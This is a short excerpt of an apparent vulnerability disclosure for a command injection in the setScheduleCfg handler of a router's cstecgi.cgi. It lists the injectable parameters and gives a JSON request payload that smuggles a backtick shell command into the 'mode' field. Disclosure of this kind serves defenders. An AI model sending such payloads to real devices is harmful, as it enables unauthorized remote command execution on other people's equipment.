...
The vulnerability is located in the function `sub_410E78` within `cstecgi.cgi`, also known as `setScheduleCfg`.

![](Pasted%20image%2020231129165453.png)
...
therefore , by controlling parameter among `mode,week,hour,minute,recHour` , we can finally make an arbitrary command execution
...
{"mode":"`id > /1.txt;`","topicurl":"setScheduleCfg","token":"00000000000000000000000000000000"}
~~~

(tips:if you use qemu emulation ur likely to patch a few places to work normally)
### Impact:

![](Pasted%20image%2020231129165645.png)